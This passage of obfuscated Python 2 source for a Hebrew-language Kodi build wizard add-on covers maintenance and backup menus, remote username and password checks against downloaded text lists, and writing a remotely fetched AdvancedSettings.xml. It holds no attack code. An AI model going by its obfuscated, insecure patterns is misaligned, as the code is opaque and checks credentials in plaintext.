	wiz .ebi ('UpdateAddonRepos()')#line:2396
	wiz .ebi ('UpdateLocalAddons()')#line:2397
	wiz .refresh ()#line:2398
def installDep (OOO000OO0O0OOOOOO ,DP =None ):#line:2400
	OO00OO0O0O000000O =os .path .join (ADDONS ,OOO000OO0O0OOOOOO ,'addon.xml')#line:2401
	if os .path .exists (OO00OO0O0O000000O ):#line:2402
		O00000000OO00OOO0 =open (OO00OO0O0O000000O ,mode ='r');OOO000OOO0OOOO000 =O00000000OO00OOO0 .read ();O00000000OO00OOO0 .close ();#line:2403
		O00OO000OO0OO0OOO =wiz .parseDOM (OOO000OOO0OOOO000 ,'import',ret ='addon')#line:2404
		for OOOOOOOOO0000O00O in O00OO000OO0OO0OOO :#line:2405
			if not 'xbmc.python'in OOOOOOOOO0000O00O :#line:2406
				if not DP ==None :#line:2407
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,OOOOOOOOO0000O00O ))#line:2408
				wiz .createTemp (OOOOOOOOO0000O00O )#line:2409
def installed (O0OOO0OO0OOOO00OO ):#line:2436
	O0OOO000OOOOOOOOO =os .path .join (ADDONS ,O0OOO0OO0OOOO00OO ,'addon.xml')#line:2437
	if os .path .exists (O0OOO000OOOOOOOOO ):#line:2438
		try :#line:2439
			OOOOO0O0OOO0O00O0 =open (O0OOO000OOOOOOOOO ,mode ='r');O0O000000OO0000OO =OOOOO0O0OOO0O00O0 .read ();OOOOO0O0OOO0O00O0 .close ()#line:2440
			OO0000OOO0O0OOO0O =wiz .parseDOM (O0O000000OO0000OO ,'addon',ret ='name',attrs ={'id':O0OOO0OO0OOOO00OO })#line:2441
			OO000O0OOOO0O000O =os .path .join (ADDONS ,O0OOO0OO0OOOO00OO ,'icon.png')#line:2442
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO0000OOO0O0OOO0O [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OO000O0OOOO0O000O )#line:2443
		except :pass #line:2444
def youtubeMenu (url =None ):#line:2446
	if not YOUTUBEFILE =='http://':#line:2447
		if url ==None :#line:2448
			O00O0OOO0OOOOOO00 =wiz .workingURL (YOUTUBEFILE )#line:2449
			O0O00000O00OOO00O =uservar .YOUTUBEFILE #line:2450
		else :#line:2451
			O00O0OOO0OOOOOO00 =wiz .workingURL (url )#line:2452
			O0O00000O00OOO00O =url #line:2453
		if O00O0OOO0OOOOOO00 ==True :#line:2454
			O0O0000O0OOO000O0 =wiz .openURL (O0O00000O00OOO00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2455
			OO000O0OOO000O00O =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0000O0OOO000O0 )#line:2456
			if len (OO000O0OOO000O00O )>0 :#line:2457
				for OO000OO00OOO0OO0O ,O0OOO0OO0O0OO0000 ,url ,OO000OO00O0O00O00 ,OO0OO0O0OO0O0O00O ,OOOO000OOO0OOO0O0 in OO000O0OOO000O00O :#line:2458
					if O0OOO0OO0O0OO0000 .lower ()=="yes":#line:2459
						addDir ("[B]%s[/B]"%OO000OO00OOO0OO0O ,'youtube',url ,description =OOOO000OOO0OOO0O0 ,icon =OO000OO00O0O00O00 ,fanart =OO0OO0O0OO0O0O00O ,themeit =THEME3 )#line:2460
					else :#line:2461
						addFile (OO000OO00OOO0OO0O ,'viewVideo',url =url ,description =OOOO000OOO0OOO0O0 ,icon =OO000OO00O0O00O00 ,fanart =OO0OO0O0OO0O0O00O ,themeit =THEME2 )#line:2462
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2463
		else :#line:2464
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2465
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2466
			addFile ('%s'%O00O0OOO0OOOOOO00 ,'',themeit =THEME3 )#line:2467
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2468
	setView ('files','viewType')#line:2469
def STARTP ():#line:2470
	OO0O0O00O0O0O000O =(ADDON .getSetting ("pass"))#line:2471
	if BUILDNAME =="":#line:2472
	 if not NOTIFY =='true':#line:2473
          OOOO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION )#line:2474
	 if not NOTIFY2 =='true':#line:2475
          OOOO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION2 )#line:2476
	 if not NOTIFY3 =='true':#line:2477
          OOOO0O00O0O00OO00 =wiz .workingURL (NOTIFICATION3 )#line:2478
	O0OO000OO0OOO0000 =OO0O0O00O0O0O000O #line:2479
	OOOO0O00O0O00OO00 =urllib2 .Request (SPEED )#line:2480
	OO0O00O0OOO0O000O =urllib2 .urlopen (OOOO0O00O0O00OO00 )#line:2481
	OO0O00OO000OO000O =OO0O00O0OOO0O000O .readlines ()#line:2483
	O0000OOO00OO0O0OO =0 #line:2487
	for O0OOOOO0O0O00O00O in OO0O00OO000OO000O :#line:2488
		if O0OOOOO0O0O00O00O .split (' ==')[0 ]==OO0O0O00O0O0O000O or O0OOOOO0O0O00O00O .split ()[0 ]==OO0O0O00O0O0O000O :#line:2489
			O0000OOO00OO0O0OO =1 #line:2490
			break #line:2491
	if O0000OOO00OO0O0OO ==0 :#line:2492
					OOOO0O0OOO00OO000 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2493
					if OOOO0O0OOO00OO000 :#line:2495
						ADDON .openSettings ()#line:2497
						STARTP ()#line:2498
						sys .exit ()#line:2499
					else :#line:2500
						sys .exit ()#line:2501
	return 'ok'#line:2505
def STARTP2 ():#line:2506
	OO0O0OOOOO0000OO0 =(ADDON .getSetting ("user"))#line:2507
	OOOOOO0OOO0000000 =(UNAME )#line:2509
	O000OOO00O00O00O0 =urllib2 .urlopen (OOOOOO0OOO0000000 )#line:2510
	OOO0OO00000OO000O =O000OOO00O00O00O0 .readlines ()#line:2511
	O00O0OOO0O0000OOO =0 #line:2512
	for O00O00OO0O0OO0O00 in OOO0OO00000OO000O :#line:2515
		if O00O00OO0O0OO0O00 .split (' ==')[0 ]==OO0O0OOOOO0000OO0 or O00O00OO0O0OO0O00 .split ()[0 ]==OO0O0OOOOO0000OO0 :#line:2516
			O00O0OOO0O0000OOO =1 #line:2517
			break #line:2518
	if O00O0OOO0O0000OOO ==0 :#line:2519
		O0OOOOOOOOO0OOOOO =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2520
		if O0OOOOOOOOO0OOOOO :#line:2522
			ADDON .openSettings ()#line:2524
			STARTP2 ()#line:2526
			sys .exit ()#line:2527
		else :#line:2528
			sys .exit ()#line:2529
	return 'ok'#line:2533
def passandpin ():#line:2534
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2535
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2536
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2537
def passandUsername ():#line:2538
	ADDON .openSettings ()#line:2539
def folderback ():#line:2542
    O0000O00000OOOOOO =ADDON .getSetting ("path")#line:2543
    if O0000O00000OOOOOO :#line:2544
      O0000O00000OOOOOO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2545
      ADDON .setSetting ("path",O0000O00000OOOOOO )#line:2546
def backmyupbuild ():#line:2549
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2553
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2554
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2555
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2557
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2558
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2559
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2561
def maintMenu (view =None ):#line:2565
	O0OO00O0OO00O00OO ='[B][COLOR green]ON[/COLOR][/B]';OO0O000OOO0O0000O ='[B][COLOR red]OFF[/COLOR][/B]'#line:2567
	O0OOO0000OO0OO0O0 ='true'if AUTOCLEANUP =='true'else 'false'#line:2568
	O0OO00O000O0O0000 ='true'if AUTOCACHE =='true'else 'false'#line:2569
	OO0O0O0OOOO00O0OO ='true'if AUTOPACKAGES =='true'else 'false'#line:2570
	O00O0O0OO0OOO00OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2571
	O0O0OO00000OO0O00 ='true'if SHOWMAINT =='true'else 'false'#line:2572
	O0OO00OOO0O0000OO ='true'if INCLUDEVIDEO =='true'else 'false'#line:2573
	OO0000O00OO000O0O ='true'if INCLUDEALL =='true'else 'false'#line:2574
	OO0OOO0O000000OOO ='true'if THIRDPARTY =='true'else 'false'#line:2575
	if wiz .Grab_Log (True )==False :OO00OO00O00OOOO0O =0 #line:2576
	else :OO00OO00O00OOOO0O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2577
	if wiz .Grab_Log (True ,True )==False :O0000OOOOO0OO0000 =0 #line:2578
	else :O0000OOOOO0OO0000 =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2579
	O0O00O0OOO00O0000 =int (OO00OO00O00OOOO0O )+int (O0000OOOOO0OO0000 )#line:2580
	OOO00OO0O000O0000 =str (O0O00O0OOO00O0000 )+' Error(s) Found'if O0O00O0OOO00O0000 >0 else 'None Found'#line:2581
	OO0O0O0O00OO0O000 =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2582
	if OO0000O00OO000O0O =='true':#line:2583
		O00OO0OOOOOOOOO00 ='true'#line:2584
		OOOOOO00000O0OOOO ='true'#line:2585
		OO0OOO00OOOOOO0O0 ='true'#line:2586
		OO00O0OOO0OO00000 ='true'#line:2587
		O0OO0OO0OO0OOOOO0 ='true'#line:2588
		OO00000O00O0OO0OO ='true'#line:2589
		O00OOOO0OO00OOO0O ='true'#line:2590
		OO000OOO0OO0O0000 ='true'#line:2591
	else :#line:2592
		O00OO0OOOOOOOOO00 ='true'if INCLUDEBOB =='true'else 'false'#line:2593
		OOOOOO00000O0OOOO ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2594
		OO0OOO00OOOOOO0O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2595
		OO00O0OOO0OO00000 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2596
		O0OO0OO0OO0OOOOO0 ='true'if INCLUDEEXODUS =='true'else 'false'#line:2597
		OO00000O00O0OO0OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2598
		O00OOOO0OO00OOO0O ='true'if INCLUDESALTS =='true'else 'false'#line:2599
		OO000OOO0OO0O0000 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2600
	O000000OOO00000O0 =wiz .getSize (PACKAGES )#line:2601
	O000OOO00OOO000OO =wiz .getSize (THUMBS )#line:2602
	OO0O0OOOOO0OO0O0O =wiz .getCacheSize ()#line:2603
	O00O00O000OO000O0 =O000000OOO00000O0 +O000OOO00OOO000OO +OO0O0OOOOO0OO0O0O #line:2604
	O00OO00OOOO000O0O =['Daily','Always','3 Days','Weekly']#line:2605
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2606
	if view =="clean"or SHOWMAINT =='true':#line:2607
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O00O00O000OO000O0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2608
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0O0OOOOO0OO0O0O ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2609
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000000OOO00000O0 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2610
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O000OOO00OOO000OO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2611
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2612
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2613
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2614
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2615
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2616
	if view =="addon"or SHOWMAINT =='false':#line:2617
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2618
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2619
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2620
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2621
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2622
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2623
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2624
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2625
	if view =="misc"or SHOWMAINT =='true':#line:2626
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2627
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2628
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2629
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2630
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2631
		addFile ('View Errors in Log: %s'%(OOO00OO0O000O0000 ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2632
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2633
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2634
		addFile ('Clear Wizard Log File%s'%OO0O0O0O00OO0O000 ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2635
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2636
	if view =="backup"or SHOWMAINT =='true':#line:2637
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2638
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2639
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2640
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2641
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2642
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2643
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2644
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2645
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2646
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2647
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2648
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2649
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2650
	if view =="tweaks"or SHOWMAINT =='true':#line:2651
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2652
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2653
		else :#line:2654
			if os .path .exists (ADVANCED ):#line:2655
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2656
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2657
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2658
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2659
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2660
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2661
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2662
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2663
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2664
	addFile ('Show All Maintenance: %s'%O0O0OO00000OO0O00 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2665
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2666
	addFile ('Third Party Wizards: %s'%OO0OOO0O000000OOO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2667
	if OO0OOO0O000000OOO =='true':#line:2668
		O000O0OOOO0000OOO =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2669
		O00O0OO0OO00OO0OO =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2670
		OO0OOOO00OO000OO0 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2671
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000O0OOOO0000OOO ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2672
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O00O0OO0OO00OO0OO ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2673
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OO0OOOO00OO000OO0 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2674
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2675
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O0OOO0000OO0OO0O0 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2676
	if O0OOO0000OO0OO0O0 =='true':#line:2677
		addFile ('--- תדירות ניקוי: [B][COLOR green]%s[/COLOR][/B]'%O00OO00OOOO000O0O [AUTOFEQ ],'changefeq',icon =ICONMAINT ,themeit =THEME3 )#line:2678
		addFile ('--- ניקוי קאש בהפעלה: %s'%O0OO00O000O0O0000 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2679
		addFile ('--- ניקוי חבילות בהפעלה: %s'%OO0O0O0OOOO00O0OO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2680
		addFile ('--- ניקוי תמונות ישנות בהפעלה: %s'%O00O0O0OO0OOO00OO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglesetting','clearthumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2681
	addFile ('ניקוי וידאו קאש','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2682
	addFile ('Include Video Cache in Clear Cache: %s'%O0OO00OOO0O0000OO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includevideo',icon =ICONMAINT ,themeit =THEME3 )#line:2683
	if O0OO00OOO0O0000OO =='true':#line:2684
		addFile ('--- Include All Video Addons: %s'%OO0000O00OO000O0O .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includeall',icon =ICONMAINT ,themeit =THEME3 )#line:2685
		addFile ('--- Include Bob: %s'%O00OO0OOOOOOOOO00 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includebob',icon =ICONMAINT ,themeit =THEME3 )#line:2686
		addFile ('--- Include Phoenix: %s'%OOOOOO00000O0OOOO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includephoenix',icon =ICONMAINT ,themeit =THEME3 )#line:2687
		addFile ('--- Include Specto: %s'%OO0OOO00OOOOOO0O0 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includespecto',icon =ICONMAINT ,themeit =THEME3 )#line:2688
		addFile ('--- Include Exodus: %s'%O0OO0OO0OO0OOOOO0 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includeexodus',icon =ICONMAINT ,themeit =THEME3 )#line:2689
		addFile ('--- Include Salts: %s'%O00OOOO0OO00OOO0O .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includesalts',icon =ICONMAINT ,themeit =THEME3 )#line:2690
		addFile ('--- Include Salts HD Lite: %s'%OO000OOO0OO0O0000 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includesaltslite',icon =ICONMAINT ,themeit =THEME3 )#line:2691
		addFile ('--- Include One Channel: %s'%OO00000O00O0OO0OO .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includeonechan',icon =ICONMAINT ,themeit =THEME3 )#line:2692
		addFile ('--- Include Genesis: %s'%OO00O0OOO0OO00000 .replace ('true',O0OO00O0OO00O00OO ).replace ('false',OO0O000OOO0O0000O ),'togglecache','includegenesis',icon =ICONMAINT ,themeit =THEME3 )#line:2693
		addFile ('--- Enable All Video Addons','togglecache','true',icon =ICONMAINT ,themeit =THEME3 )#line:2694
		addFile ('--- Disable All Video Addons','togglecache','false',icon =ICONMAINT ,themeit =THEME3 )#line:2695
	setView ('files','viewType')#line:2696
def advancedWindow (url =None ):#line:2698
	if not ADVANCEDFILE =='http://':#line:2699
		if url ==None :#line:2700
			OOO00O00O0OOO00OO =wiz .workingURL (ADVANCEDFILE )#line:2701
			O00O0OOOOOOO00OOO =uservar .ADVANCEDFILE #line:2702
		else :#line:2703
			OOO00O00O0OOO00OO =wiz .workingURL (url )#line:2704
			O00O0OOOOOOO00OOO =url #line:2705
		addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2706
		if os .path .exists (ADVANCED ):#line:2707
			addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2708
			addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2709
		if OOO00O00O0OOO00OO ==True :#line:2710
			if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONMAINT ,themeit =THEME3 )#line:2711
			O0O0O0OO00000000O =wiz .openURL (O00O0OOOOOOO00OOO ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2712
			OOO00000OO0O00O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO00000000O )#line:2713
			if len (OOO00000OO0O00O00 )>0 :#line:2714
				for OO0O0OO0OO0OOO0OO ,OOOO0O00OOO0000OO ,url ,OO0OO0000OOOOOOOO ,O0O00000OOO0000O0 ,O00000OO0000OOO0O in OOO00000OO0O00O00 :#line:2715
					if OOOO0O00OOO0000OO .lower ()=="yes":#line:2716
						addDir ("[B]%s[/B]"%OO0O0OO0OO0OOO0OO ,'advancedsetting',url ,description =O00000OO0000OOO0O ,icon =OO0OO0000OOOOOOOO ,fanart =O0O00000OOO0000O0 ,themeit =THEME3 )#line:2717
					else :#line:2718
						addFile (OO0O0OO0OO0OOO0OO ,'writeadvanced',OO0O0OO0OO0OOO0OO ,url ,description =O00000OO0000OOO0O ,icon =OO0OO0000OOOOOOOO ,fanart =O0O00000OOO0000O0 ,themeit =THEME2 )#line:2719
			else :wiz .log ("[Advanced Settings] ERROR: Invalid Format.")#line:2720
		else :wiz .log ("[Advanced Settings] URL not working: %s"%OOO00O00O0OOO00OO )#line:2721
	else :wiz .log ("[Advanced Settings] not Enabled")#line:2722
def writeAdvanced (O0OO0O0O00O0OO0O0 ,O0O0000000O0OO00O ):#line:2724
	O000OO0000O0O00OO =wiz .workingURL (O0O0000000O0OO00O )#line:2725
	if O000OO0000O0O00OO ==True :#line:2726
		if os .path .exists (ADVANCED ):O00O000O000O0O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to overwrite your current Advanced Settings with [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OO0O0O00O0OO0O0 ),yeslabel ="[B][COLOR green]Overwrite[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel[/COLOR][/B]")#line:2727
		else :O00O000O000O0O00O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין [COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,O0OO0O0O00O0OO0O0 ),yeslabel ="[B][COLOR green]התקנה[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:2728
		if O00O000O000O0O00O ==1 :#line:2730
			OOOO0O0O000O0O0OO =wiz .openURL (O0O0000000O0OO00O )#line:2731
			OOOO0000OO0OOO000 =open (ADVANCED ,'w');#line:2732
			OOOO0000OO0OOO000 .write (OOOO0O0O000O0O0OO )#line:2733
			OOOO0000OO0OOO000 .close ()#line:2734
			DIALOG .ok (ADDONTITLE ,'[COLOR %s]AdvancedSettings.xml file has been successfully written.  Once you click okay it will force close kodi.[/COLOR]'%COLOR2 )#line:2735
			wiz .killxbmc (True )#line:2736
		else :wiz .log ("[Advanced Settings] install canceled");wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Write Cancelled![/COLOR]"%COLOR2 );return #line:2737
	else :wiz .log ("[Advanced Settings] URL not working: %s"%O000OO0000O0O00OO );wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,ADDONTITLE ),"[COLOR %s]URL Not Working[/COLOR]"%COLOR2 )#line:2738
def viewAdvanced ():#line:2740
	OO000OO000O00O0OO =open (ADVANCED )#line:2741
	OOOO00O0O0000O0OO =OO000OO000O00O0OO .read ().replace ('\t','    ')#line:2742
	wiz .TextBox (ADDONTITLE ,OOOO00O0O0000O0OO )#line:2743
	OO000OO000O00O0OO .close ()#line:2744
def removeAdvanced ():#line:2746
	if os .path .exists (ADVANCED ):#line:2747
		wiz .removeFile (ADVANCED )#line:2748
	else :LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]AdvancedSettings.xml not found[/COLOR]")#line:2749
def showAutoAdvanced ():#line:2751
	notify .autoConfig ()#line:2752
def getIP ():#line:2754
	OO0O00O00O000OOO0 ='http://whatismyipaddress.com/'#line:2755
	if not wiz .workingURL (OO0O00O00O000OOO0 ):return 'Unknown','Unknown','Unknown'#line:2756
	O00O0OOO00O0O00OO =wiz .openURL (OO0O00O00O000OOO0 ).replace ('\n','').replace ('\r','')#line:2757
	if not 'Access Denied'in O00O0OOO00O0O00OO :#line:2758
		O0OOO00O000O00000 =re .compile ('whatismyipaddress.com/ip/(.+?)"').findall (O00O0OOO00O0O00OO )#line:2759
